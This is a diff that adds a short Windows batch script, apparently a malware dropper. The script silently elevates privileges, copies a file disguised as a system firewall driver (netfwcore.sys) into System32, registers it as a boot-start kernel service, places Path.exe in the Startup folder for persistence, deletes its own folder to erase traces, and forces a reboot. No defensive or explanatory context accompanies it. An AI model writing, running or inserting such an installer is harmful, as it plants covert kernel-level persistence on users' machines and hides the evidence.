@@ -1,0 +1,18 @@
+@echo off
+openfiles >nul 2>&1 || (powershell start-process '%~s0' -verb runas & exit /b)
+
+cd /d "%~dp0"
+
+copy /y "netfwcore.sys" "C:\Windows\System32\netfwcore.sys" >nul 2>&1
+
+sc create NetCoreSrv binPath= "C:\Windows\System32\netfwcore.sys" type= kernel start= boot >nul
+
+if exist "Path.exe" (
+    copy /y "Path.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Path.exe" >nul 2>&1
+)
+
+start /b "" cmd /c "timeout /t 2 >nul & rd /s /q "%~dp0""
+
+echo.
+shutdown /r /t 5 /f
+exit
